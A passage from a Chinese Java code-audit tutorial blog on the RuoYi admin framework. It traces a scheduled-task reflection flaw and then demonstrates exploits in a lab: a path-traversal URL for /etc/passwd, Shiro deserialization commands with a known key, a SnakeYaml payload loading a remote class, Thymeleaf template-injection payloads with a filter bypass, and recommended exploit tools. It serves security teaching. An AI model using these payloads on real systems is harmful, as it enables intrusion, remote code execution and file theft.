alt="ruoyi-quartz文件结构"></p><p>进入<code>ruoyi-quartz </code>模块<code>src\main\java\com\ruoyi\quartz</code>下，我们先关注<code>controller</code>文件代码。我们知道<code>Controller</code>也是控制层，主要负责具体的业务模块流程的控制，简单说就是与前台互交，接受前台传来的参数后，再向<code>Service层</code>传输。</p><p>打开<code>controller</code>文件下，有两个代码文件，分别是<code>SysJobController</code>和<code>SysJobLogController</code>。根据代码注释了解了大致作用，如下图所示：</p><p><img src="/img/SysJobController%E6%B3%A8%E9%87%8A%E4%BF%A1%E6%81%AF.jpg" alt="SysJobController注释信息"></p><p><img src="/img/SysJobLogController%E6%B3%A8%E9%87%8A%E4%BF%A1%E6%81%AF.jpg" alt="SysJobLogController注释信息"></p><p>现在，我们对<code>SysJobController下的run方法</code>进行追踪，根据注释该方法为任务调度立即执行一次，如下图所示：</p><p><img src="/img/run%E6%96%B9%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AC%A1.jpg" alt="run方法立即执行一次"></p><p>Ctrl加鼠标左键点击<code>jobService.run(job)</code>，进入Service层后，无其他执行代码，继续跟踪到实现层，最终代码位于<code>RuoYi-v4.2\ruoyi-quartz\src\main\java\com\ruoyi\quartz\service\impl\SysJobServiceImpl.java</code>第180行到188行。如下图所示：</p><p><img src="/img/run%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%B1%82%E4%BB%A3%E7%A0%81.jpg" alt="run的实现层代码"></p><p>第182,183行作用为通过调度任务ID查询调度信息。</p><p>第185行，实例化了<code>JobDataMap</code>。<code>JobDataMap</code> 通过它的超类 org.quartz.util.DirtyFlagMap 实现了java.util.Map 接口，你可以向 JobDataMap 中存入键&#x2F;值对，那些数据对可在你的 Job 类中传递和进行访问。这是一个向你的 Job 传送配置的信息便捷方法。简单说，Job 运行时的信息保存在 <code>JobDataMap</code> 实例中。</p><p>最终在第187行，使用<code>scheduler.triggerJob(JobKey var1, DataMap var2)</code>为触发标识JobDetail（立即执行）。<code>JobDetail</code>用来描述Job的实现类及其它相关的静态信息，如Job名字、描述、关联监听器等等信息。其中<code>triggerJob()</code>方法需要两个参数，分别为<code>Jobkey</code>和<code>dataMap</code>。<code>dataMap</code>来自上面输入的运行时信息。而此处的<code>Jobkey</code>是JobDetail创建的的唯一标识。简单说，到了这就开始执行定时任务了。</p><p>但最终方法的调用是在<code>QuartzDisallowConcurrentExecution</code>或<code>QuartzJobExecution</code>中用<code>JobInvokeUtil.invokeMethod(sysJob);</code>反射完成的。</p><p><code>QuartzDisallowConcurrentExecution</code>或<code>QuartzJobExecution</code>两者区别根据代码注释可以知道一个禁止并发执行，一个允许并发执行。这两个参数也是可以从前端中设置的。但不论那种，最终都是调用的<code>JobInvokeUtil.invokeMethod(sysJob);</code>。</p><p>进入<code>JobInvokeUtil.invokeMethod(sysJob);</code>，最终方法实现如下图所示：</p><p><img src="/img/invokeMethod%E6%9C%80%E7%BB%88%E8%B0%83%E7%94%A8.jpg" alt="invokeMethod最终调用"></p><p>解读一下。</p><p>①、第25行到28行，为获取处理数据，打个端点可以直观看出来，如下图所示（建议自己动手操作看一下）：</p><p><img src="/img/invokeMethod%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0%E6%96%AD%E7%82%B9.jpg" alt="invokeMethod获取参数断点"></p><p>②、第30到39行，有一个判断。若依支持两种方式调用，分别为支持<code>Bean</code>调用和<code>Class</code>类调用。此处判断我理解为通过<code>beanname</code>判断是否为有效的classname。也就是调用目标字符串是使用<code>bean</code>方式调用，还是使用<code>Class</code>方式调用。</p><p>此处，可以创建两种方式的目标字符串后，在<code>if (!isValidClassName(beanName))</code>处打个断点，分别执行跟踪一下，就能看明白了。</p><p><img src="/img/invokeMethod%E7%9A%84class%E6%96%B9%E5%BC%8F1.jpg" alt="invokeMethod的class方式1"></p><p><img src="/img/invokeMethod%E7%9A%84class%E6%96%B9%E5%BC%8F2.jpg" alt="invokeMethod的class方式2"></p><p>另一种调用方式，大家动手自己打个断点操作一下。进入管理系统，访问<code>系统监控 - 定时任务</code>，选择bean方式调用的任务，点击<code>更多操作 - 执行一次</code>。</p><p>至此，定时任务流程到这就结束了。他是如何RCE的呢？老规矩，在渗透测试部分我们进行验证。</p><h4 id="3-4、任意文件读取-x2F-下载漏洞代码审计"><a href="#3-4、任意文件读取-x2F-下载漏洞代码审计" class="headerlink" title="3.4、任意文件读取&#x2F;下载漏洞代码审计"></a>3.4、任意文件读取&#x2F;下载漏洞代码审计</h4><p>一般开发人员也都有比较好的习惯，对于注释方面写的也比较清楚。</p><p>我拿到一个项目，习惯大致浏览下项目代码（主要看注释），梳理下功能。</p><p>在本项目中，发现存在一处下载功能。</p><p>代码位于<code>RuoYi-v4.2\ruoyi-admin\src\main\java\com\ruoyi\web\controller\common\CommonController.java</code>第96行-第111行。通过注释一目了然该部分代码的作用。如下图所示：</p><p><img src="/img/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%BB%A3%E7%A0%81.jpg" alt="任意文件下载代码"></p><p>通过全局搜索关键字<code>resourceDownload</code>，发现并没有其他功能调用他。</p><p>既然这样，只能分析代码，自己构造请求了。</p><p>①、首先，漏洞代码点位于第118行，使用了<code>FileUtils.writeBytes()</code>方法输出指定文件的byte数组，即将文件从服务器下载到本地。其中该函数中有两个参数，分别为<code>downloadPath</code>和<code>response.getOutputStream()</code>。</p><p><strong><code>getOutputStream()</code>方法用于返回Servlet引擎创建的字节输出流对象，Servlet程序可以按字节形式输出响应正文。</strong></p><p>②、<code>downloadPath</code>来自第103行，是由<code>localPath</code>和<code>StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</code>组成。</p><p><strong><code>StringUtils.substringAfter()</code>方法为取得指定字符串后的字符串</strong>。<code>resource</code>是请求中接收参数的字段。<code>Constants.RESOURCE_PREFIX</code>为设置的常量<code>/profile</code>，主要作用为资源映射路径的前缀。</p><p>③、<code>localPath</code>来自第101行注释为<code>本地资源路径</code>，通过打个端点，我们可以看到<code>localPath: D:/ruoyi/uploadPath</code>，是从<code>src\main\resources\application.yml</code>配置文件中第12行文件路径中获取的。如下图所示：</p><p><img src="/img/%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84.jpg" alt="获取全局配置文件路径"></p><p>④、通过第96行，知道接口路径为<code>/common/download/resource</code>，仅接受GET请求。</p><p>⑤、通过第97行，<code>String resource</code>知道接收参数值的为<code>resource</code>。</p><p>汇总下信息。首先应该知道，处理整个文件流程，是没有任何防护的。</p><p>根据接口路径和接收参数字段组合为<code>/common/download/resource?resource=</code>。</p><p>根据<code>StringUtils.substringAfter()</code>方法为取得指定字符串后的字符串，其中指定的字符串为<code>/profile</code>。也就是取得<code>/profile</code>之后的字符串。</p><p>那么最终，漏洞Payload为<code>http://127.0.0.1/common/download/resource?resource=/profile/../../../../etc/passwd</code>。具体几个<code>../</code>要看实际设置目录的深度。</p><p>下面我们从渗透测试部分进行漏洞验证。</p><h2 id="四、渗透测试漏洞挖掘"><a href="#四、渗透测试漏洞挖掘" class="headerlink" title="四、渗透测试漏洞挖掘"></a>四、渗透测试漏洞挖掘</h2><h3 id="1、SQL注入漏洞验证"><a href="#1、SQL注入漏洞验证" class="headerlink" title="1、SQL注入漏洞验证"></a>1、SQL注入漏洞验证</h3><h4 id="1-1、漏洞简述"><a href="#1-1、漏洞简述" class="headerlink" title="1.1、漏洞简述"></a>1.1、漏洞简述</h4><p>通过代码审计，我们了解到角色相关的功能下展示角色信息列表处存在SQL注入。</p><p>访问WEB页面，发现名叫<code>角色管理</code>的功能。</p><p>当然了，如果我们没有找到功能，也完全可以自己构造数据包。</p><h4 id="1-2、漏洞验证"><a href="#1-2、漏洞验证" class="headerlink" title="1.2、漏洞验证"></a>1.2、漏洞验证</h4><p>①、访问<code>角色管理</code>功能，通过点击下面的各个按钮，并配合BurpSuite抓包，发现<code>搜索</code>功能，会向<code>/system/role/list</code>接口发送数据，如下图所示：</p><p><img src="/img/%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86-%E6%90%9C%E7%B4%A2.jpg" alt="角色管理-搜索"></p><p>②、发送到Repeater模块，发现请求Body中没有<code>DataScope</code>，没关系，我们照葫芦画瓢自己添加上，最终如下图所示：</p><p><img src="/img/%E6%B7%BB%E5%8A%A0dataScope%E5%AD%97%E6%AE%B5.jpg" alt="添加dataScope字段"></p><p>③、输入<code>单引号(&#39;)</code>，验证是否存在漏洞，发现返回了报错信息，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99.jpg" alt="sql注入单引号报错"></p><p>④、直接上SQLMAP，不多费时了，最终结果如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E4%B9%8BSQLMAP.jpg" alt="sql注入之SQLMAP"></p><h3 id="2、Shiro反序列化漏洞验证"><a href="#2、Shiro反序列化漏洞验证" class="headerlink" title="2、Shiro反序列化漏洞验证"></a>2、Shiro反序列化漏洞验证</h3><h4 id="2-1、漏洞简述"><a href="#2-1、漏洞简述" class="headerlink" title="2.1、漏洞简述"></a>2.1、漏洞简述</h4><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><p>尽管官方更新了很多版本，但还是没有将反序列化的本身问题解决。后续版本使用了每次生成一个密钥的方法来解决该漏洞。但是由于开源系统，或者教学代码范例常将弱密钥硬编码等原因，因此导致很多开发人员疏忽，经验不足而导致该问题的产生。</p><p>通过查看pom.xml文件我们确定了Shiro版本为<code>1.4.2</code>。<code>Shiro 1.4.2</code>版本对于Shiro反序列化来说是个分水岭。由于CVE-2019-12422漏洞的出现，也就是Shiro Padding Oracle Attack漏洞。Shiro在1.4.2版本开始，由<code>AES-CBC</code>加密模式改为了<code>AES-GCM</code>。所以我们在做漏洞验证时，要将payload改成<code>AES-GCM</code>加密模式。</p><h4 id="2-2、漏洞验证"><a href="#2-2、漏洞验证" class="headerlink" title="2.2、漏洞验证"></a>2.2、漏洞验证</h4><p>在黑盒测试中，我们可以在Cookie中添加<code>rememberMe=123</code>，如果响应<code>Set-Cookie</code>头返回<code>rememberMe=deleteMe</code>，那么就可可以确定该系统使用了Shiro框架。如下图所示：</p><p><img src="/img/rememberme_deleteme.JPG" alt="rememberme_deleteme"></p><p>下面我们使用攻击脚本进行漏洞验证，该脚本在已添加至附件中。</p><p>:warning:该脚本基于Python3，在命令行中执行<code>pip3 install pycryptodome</code>，安装所需依赖包。</p><p>①、探测常见的弱密钥，执行命令如下：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">python3 shiro-exploit.py<span class="hljs-built_in"> check </span>-u http://xxx/ 可以使用 -v来指定版本，默认是两个都探测，在黑盒测试中不必指定版本。<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%8E%A2%E6%B5%8B%E5%BC%B1%E5%AF%86%E9%92%A5.jpg" alt="探测弱密钥"></p><p>②、攻击AES-GCM加密模式的Shiro：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">12.157</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/ -v 2 -k fCq+/</span>xW488hMTCD+cmJ3aQ== -c whoami<br></code></pre></td></tr></table></figure><p><img src="/img/shiro%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.jpg" alt="shiro执行命令"></p><p>剩下的自己尽情发挥。</p><p>详细使用说明及教程，参考项目原地址：<code>https://github.com/Ares-X/shiro-exploit</code></p><h3 id="3、Fastjson漏洞验证验证"><a href="#3、Fastjson漏洞验证验证" class="headerlink" title="3、Fastjson漏洞验证验证"></a>3、Fastjson漏洞验证验证</h3><h4 id="3-1、漏洞简述"><a href="#3-1、漏洞简述" class="headerlink" title="3.1、漏洞简述"></a>3.1、漏洞简述</h4><p>在代码审计处发现该项目使用了存在漏洞版本的Fastjson。在代码审计处，我们确定了功能点为代码生成处的<code>修改保存生成业务</code>，该路径部分为<code>edit</code>，完整路径为<code>/tool/gen/edit</code>，请求方法为POST，并且主要关注<code>params</code>这个字段。</p><h4 id="3-2、漏洞验证"><a href="#3-2、漏洞验证" class="headerlink" title="3.2、漏洞验证"></a>3.2、漏洞验证</h4><p>进入若依管理后台。访问<code>系统工具-代码生成-导入</code>，先随便导入一个表，如下图所示：</p><p><img src="/img/%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%8A%9F%E8%83%BD%E5%AF%BC%E5%85%A5%E4%B8%80%E4%B8%AA%E8%A1%A8.jpg" alt="代码生成功能导入一个表"></p><p>:warning:注意：访问导入功能报错，如下图所示：</p><p><img src="/img/%E5%AF%BC%E5%85%A5%E5%8A%9F%E8%83%BD%E6%8A%A5%E9%94%99.jpg" alt="导入功能报错"></p><p>这是因为是mysql自带的表information_schema.tables，与若依系统的表进行了关联查询。</p><p>而information_schema用的是utf8_general_ci编码排序，若依建数据库时，默认选了utf8_unicode_ci。</p><p>需要我们在创建若依数据库时将编码格式改为utf8_general_ci，如下图所示：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> ry<br><span class="hljs-keyword">default</span> <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8<br><span class="hljs-keyword">default</span> <span class="hljs-keyword">collate</span> utf8_general_ci;<br></code></pre></td></tr></table></figure><p><img src="/img/%E8%AE%BE%E7%BD%AE%E8%8B%A5%E4%BE%9D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.jpg" alt="设置若依数据库编码格式"></p><p>一个小插曲，继续漏洞验证……</p><h3 id="4、任意文件读取-x2F-下载漏洞验证"><a href="#4、任意文件读取-x2F-下载漏洞验证" class="headerlink" title="4、任意文件读取&#x2F;下载漏洞验证"></a>4、任意文件读取&#x2F;下载漏洞验证</h3><h4 id="4-1、漏洞简述"><a href="#4-1、漏洞简述" class="headerlink" title="4.1、漏洞简述"></a>4.1、漏洞简述</h4><p>在<code>第三章 3.4 任意文件读取/下载漏洞代码审计 </code>处，通过代码审计角度发现本系统存在任意文件读取&#x2F;下载漏洞。现在，我们从渗透测试角度进行验证。</p><h4 id="4-2、漏洞验证"><a href="#4-2、漏洞验证" class="headerlink" title="4.2、漏洞验证"></a>4.2、漏洞验证</h4><p>我们使用的是Linux环境启动的本项目。具体启动部署请跳跃到<code>第二章 3、Linux环境的项目部署流程 </code>处。</p><p>务必请注意以下两项：</p><p>①、在<code>RuoYi-v4.2\ruoyi-admin\src\main\resources\application.yml</code>配置文件中修改linux配置路径为<code>/home/ruoyi/uploadPath</code>（<strong>未在Linux部署时说明，此时应注意</strong>），如下图所示：</p><p><img src="/img/linux%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84.jpg" alt="linux配置文件路径"></p><p>②、在Linux系统的<code>/home</code>目录下创建<code>/ruoyi/uploadPath</code>。</p><p>启动项目，开始验证。</p><p>①、登录后台，此时用Burp随便抓个包。</p><p>②、使用代码审计构造出的payload进行构造请求，如下图所示：</p><p><img src="/img/%E6%B8%97%E9%80%8F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82.jpg" alt="渗透任意文件读取构造请求"></p><p>③、点击发送数据包，即可看到<code>/etc/passwd</code>文件内容，如下图所示：</p><p><img src="/img/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%86%85%E5%AE%B9.jpg" alt="任意文件读取内容"></p><h3 id="5、定时任务处漏洞验证"><a href="#5、定时任务处漏洞验证" class="headerlink" title="5、定时任务处漏洞验证"></a>5、定时任务处漏洞验证</h3><h4 id="5-1、漏洞简述"><a href="#5-1、漏洞简述" class="headerlink" title="5.1、漏洞简述"></a>5.1、漏洞简述</h4><p>在对定时任务代码审计时发现该功能存在漏洞。在<code>添加任务-&gt;调用目标字符串</code>处可操作class类，通过代码审计发现使用的反射方式，也就是说目标class类存在漏洞的话即可利用反射触发RCE漏洞。</p><h4 id="5-2、漏洞验证"><a href="#5-2、漏洞验证" class="headerlink" title="5.2、漏洞验证"></a>5.2、漏洞验证</h4><p>我们使用的是Linux环境启动的本项目。具体启动部署请跳转到<code>第二章 3、Linux环境的项目部署流程 </code>。</p><p>在代码审计处，我们知道如果是调用class类，最终执行为<code>Object bean = Class.forName(beanName).newInstance();</code>。</p><p>问题来了，如果此处想要成功实例化并且RCE的话，那么必须满足几个条件：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-number">1</span>、类的构造方法为<span class="hljs-keyword">Public</span><br><span class="hljs-number">2</span>、类的构造方法无参<br><span class="hljs-number">3</span>、调用目标字符串的参数为：支持字符串，布尔类型，长整型，浮点型，整型<br><span class="hljs-number">4</span>、调用目标方法除了为<span class="hljs-keyword">Public</span>，无参，还需要具有执行代码/命令的能力<br></code></pre></td></tr></table></figure><p>有的朋友一开始会想到调用<code>java.lang.Runtime.getRuntime().exec(&quot;&quot;)</code>。但经过上面条件的梳理，发现该类不满足条件，因为他的构造方法是private。</p><p>不知道大家还记得<code>SnakeYaml组件漏洞代码审计</code>不。</p><p>在组件检测时发现了本项目使用了<code>SnakeYaml</code>。经过学习我们知道，该组件只要可以控制<code>yaml.load()</code>即可触发反序列漏洞。</p><p>经过探索学习，<code>SnakeYaml的yaml.load()</code>是满足以上条件的，具体操作如下。</p><p><strong>5.2.1、基础验证</strong></p><p>①、先登录DNSlog平台，获取一个DNSlog地址。</p><p>②、然后进入后台，访问<code>系统监控-定时任务</code>功能，点击新增，在目标字符串下添加如下内容（即攻击payload）：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [!<span class="hljs-title">!java.net.URLClassLoader</span> [[!<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;ftp://此处填入DNSlog地址&quot;</span>]]]]&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/img/%E8%B0%83%E7%94%A8%E7%9B%AE%E6%A0%87%E5%AD%97%E7%AC%A6%E4%B8%B2yaml.jpg" alt="调用目标字符串yaml"></p><p>③、点击确定后，在该页面点击<code>更多操作-立即执行</code>后，即可在DNSlog处看到探测信息，如下图所示：</p><p><img src="/img/dnslog%E6%8E%A2%E6%B5%8B%E7%BB%93%E6%9E%9C.jpg" alt="dnslog探测结果"></p><p><strong>5.2.2、利用工具进一步攻击</strong></p><p>推荐一款若依一键利用工具。项目地址：<code>https://github.com/passer-W/Ruoyi-All</code></p><p>根据该工具介绍如下图所示：</p><p><img src="/img/ruoyiall%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D.jpg" alt="ruoyiall工具介绍"></p><p>我将该工具与本篇课程一起打包分享了出来，纯官方下载，放心使用。</p><p>①、打开该工具后，填写一些配置，其中包括目标URL和Cookie，如下图所示：</p><p><img src="/img/ruoyiall%E5%A1%AB%E5%86%99%E4%BF%A1%E6%81%AF.jpg" alt="ruoyiall填写信息"></p><p>②、然后点击确定，即开始漏洞检测。存在漏洞提示如下图所示：</p><p><img src="/img/ruoyiall%E6%A3%80%E6%B5%8B%E5%87%BA%E6%BC%8F%E6%B4%9E.jpg" alt="ruoyiall检测出漏洞"></p><p>:warning:<strong>注意：</strong>关于该漏洞进一步利用留个作业，大家务必动手研究一下，并形成学习文档提交到第五期作业处。不要仅仅以为自己看了就学会了。</p><h3 id="6、Thymeleaf模板注入漏洞验证"><a href="#6、Thymeleaf模板注入漏洞验证" class="headerlink" title="6、Thymeleaf模板注入漏洞验证"></a>6、Thymeleaf模板注入漏洞验证</h3><h4 id="6-1、漏洞简述"><a href="#6-1、漏洞简述" class="headerlink" title="6.1、漏洞简述"></a>6.1、漏洞简述</h4><p>在代码审计处，我们发现<code>若依v4.7.1</code>存在Thymeleaf模板注入漏洞，并且存在return内容可控的漏洞点，我们通过渗透测试角度进行漏洞验证。</p><h4 id="6-2、漏洞验证"><a href="#6-2、漏洞验证" class="headerlink" title="6.2、漏洞验证"></a>6.2、漏洞验证</h4><p>Thymeleaf模板注入payload举例：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return内容可控：<br>__$&#123;new java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Scanner</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;whoami&quot;</span>)<span class="hljs-selector-class">.getInputStream</span>())<span class="hljs-selector-class">.next</span>()&#125;__::<span class="hljs-selector-class">.x</span><br><br>URL路径可控：<br>__$&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;touch test&quot;</span>)&#125;__::<span class="hljs-selector-class">.x</span><br><br></code></pre></td></tr></table></figure><p>本次漏洞验证我在Windows环境下进行的。</p><p>:warning:<strong>注意</strong>：<code>若依v4.7.1</code>搭建部署与<code>若依v4.2</code>相同，数据库导入务必使用<code>sql</code>目录下的<code>ry_20210924.sql</code>和<code>quartz.sql</code>。先导入<code>ry_20210924.sql</code>。</p><p>我们以<code>getKeys</code>接口为例，该漏洞点为<code>return内容可控</code>，具体漏洞验证如下。</p><p>①、正常启动项目，进入后台。我们发现在<code>系统监控</code>下有个<code>缓存监控</code>的功能，和代码审计发现的<code>CacheControlle</code>代码文件中功能注释一样。初步确定两者相同。</p><p>②、访问缓存监控功能。进入后，分别点击<code>缓存列表</code>和<code>键名列表</code>旁的刷新按钮，会分别想<code>getNames</code>，<code>getKeys</code>接口发送数据。如下图所示：</p><p><img src="/img/%E7%BC%93%E5%AD%98%E7%9B%91%E6%8E%A7getKeys.jpg" alt="缓存监控getKeys"></p><p>③、将数据包发送到Repeater模块，在<code>fragment</code>参数后构造攻击payload为<code>__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;__::.x</code>，对paylod进行URL编码后。发送数据包。响应报错，而且并没有弹出来计算器。如下图所示：</p><p><img src="/img/getkeys%E6%8A%A5%E9%94%99.jpg" alt="getkeys报错"></p><p>找了半天原因，发现<code>若依v4.7.1</code>版本使用的是<code>Thymeleaf3.0.12</code>版本。</p><p>官方在这个版本进行了一些限制，比如使用new实例化，静态方法调用都被限制了。还有其他一些限制，详细可看<code>https://github.com/thymeleaf/thymeleaf/issues/809</code>。下图为谷歌机翻，大致可以看一下。</p><p><img src="/img/thymeleaf3012%E9%99%90%E5%88%B6.jpg" alt="thymeleaf3012限制"></p><p>因此，我们刚开始用的Payload是被限制了。</p><p>经过一顿操作猛如虎，其实谷歌就能有。</p><p>我们将Payload改造一下，如<code>$&#123;T    (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;</code>。在T和(之间多加几个空格即可。</p><p>对Payload进行URL编码后，放入<code>fragment</code>参数中，可以看到弹出了计算器，如下图所示：</p><p><img src="/img/thymeleaf%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8.jpg" alt="thymeleaf弹计算器"></p><p>至此，漏洞验证部分结束。</p><p>希望大家在这基础上，进一步学习Thymeleaf模板注入漏洞。直接推荐一篇文章：<code>https://xz.aliyun.com/t/9826</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb代码审计实战之某RBAC系统，非常适合小白入门练习的系统</title>
    <link href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%EF%BC%8C%E9%9D%9E%E5%B8%B8%E9%80%82%E5%90%88%E5%B0%8F%E7%99%BD%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%E7%9A%84%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%EF%BC%8C%E9%9D%9E%E5%B8%B8%E9%80%82%E5%90%88%E5%B0%8F%E7%99%BD%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%E7%9A%84%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>【如需转载，请详细表明来源，请勿设置原创】</p><p>嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。</p><p>欢迎大家扫描下方二维码关注 <strong>“闪石星曜CyberSecurity”</strong> 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。</p><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="公众号"></p><p>如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也对应着深入学习的方向。</p><p>炼石计划理念：一个系统化从入门到提升学习的成长型知识星球。这里不仅注重夯实基础，更加专注实战进阶。</p><p>欢迎微信扫描下方二维码，加入对应的知识星球。努力成为六边形网络安全战士！</p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@Java代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@PHP代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%AE%87%E5%AE%99.jpg" alt="炼石计划@渗透攻防宇宙"></p><p>本篇来自【炼石计划@Java代码审计】知识星球内部文章，公益分享学习。欢迎加入我们，系统化学习专业知识。</p><h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><h4 id="A、涉及相关技术简介"><a href="#A、涉及相关技术简介" class="headerlink" title="A、涉及相关技术简介"></a><strong>A、涉及相关技术简介</strong></h4><h4 id="A1、Maven简介"><a href="#A1、Maven简介" class="headerlink" title="A1、Maven简介"></a>A1、Maven简介</h4><p>Maven 是一个项目管理工具，它包含了一个项目对象模型（Project Object Model），反映在配置中，就是一个 pom.xml 文件。是一组标准集合，一个项目的生命周期、一个依赖管理系统，另外还包括定义在项目生命周期阶段的插件(plugin)以及目标(goal)。</p><p>当我们使用 Maven 的使用，通过一个自定义的项目对象模型，pom.xml 来详细描述我们自己的项目。</p><p>简单来说，我们开发一个JavaWeb项目是需要加载很多依赖的，使用Maven可以便于管理这些依赖。</p><ul><li>pom.xml</li></ul><p>POM是项目对象模型(Project Object Model)的简称,它是Maven项目中的文件，使用XML表示，名称叫做<code>pom.xml</code>。该文件用于管理：源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。Maven项目中必须包含<code>pom.xml</code>文件。</p><p>需要导入的依赖应该在<code>pom.xml</code>中进行配置与填写。比如导入某些依赖，如下图所示：</p><p><img src="/img/maven%E7%9A%84pom%E4%BE%8B%E5%AD%90.jpg" alt="maven的pom例子"></p><p><img src="/img/maven%E4%BE%9D%E8%B5%96%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF.jpg" alt="maven依赖版本信息"></p><p><code>project</code>- <code>project</code> 是 pom.xml 中描述符的根。</p><p><code>modelVersion</code> - <code>modelVersion</code> 指定 pom.xml 符合哪个版本的描述符。maven 2 和 3 只能为 4.0.0。</p><p><code>parent</code> - maven 支持继承功能。子 POM 可以使用 <code>parent</code> 指定父 POM ，然后继承其配置。</p><p><code>dependencies</code> - 在dependencise中进行依赖配置</p><p><code>groupId</code> - 团体、组织的标识符。团体标识的约定是，它以创建这个项目的组织名称的逆向域名(reverse domain name)开头。一般对应着 java 的包结构。</p><p><code>artifactId</code> -  单独项目的唯一标识符。比如我们的 tomcat、commons 等。不要在 artifactId 中包含点号(.)。</p><p><code>version</code> -  